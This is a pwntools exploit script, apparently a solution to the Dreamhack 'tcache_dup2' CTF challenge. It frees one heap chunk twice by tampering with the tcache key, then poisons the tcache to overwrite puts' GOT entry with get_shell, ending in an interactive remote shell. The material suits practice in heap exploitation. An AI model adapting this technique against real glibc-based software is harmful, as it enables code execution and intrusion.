from pwn import *

#context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./tcache_dup2")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


def create(size, data):
    p.sendlineafter("> ", b"1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)


def modify(idx, size, data):
    p.sendlineafter("> ", b"2")
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


def delete(idx):
    p.sendlineafter("> ", b"3")
    p.sendlineafter("idx: ", str(idx))


elf = ELF("./tcache_dup2")
libc = ELF("./libc-2.30.so")

get_shell = elf.symbols["get_shell"]
puts_got = elf.got["puts"]
# system func must work with 0x10-step instruction.

# [1] Tcache Duplication Considering Chunk Count
create(0x10, b"AAAA")  # idx: 0
create(0x10, b"BBBB")  # idx: 1
create(0x10, b"CCCC")  # idx: 2
delete(0)                   # stack: (bottom) 0
delete(1)                   # stack: (bottom) 0 -> 1
modify(1, 0x10, b"A" * 8 + b"ABCDEFGH")
delete(1)                   # stack: (bottom) 0 -> 1 -> 1
# count: 3

# [2] Tcache Poisoning
# stack: (bottom) 0 -> printf_got -> 1, count: 2
create(0x10, p64(puts_got))
# stack: (bottom) 0 -> printf_got, count: 1
create(0x10, b'BBBB')
create(0x10, p64(get_shell))        # stack: (bottom) 0, count: 0

p.interactive()
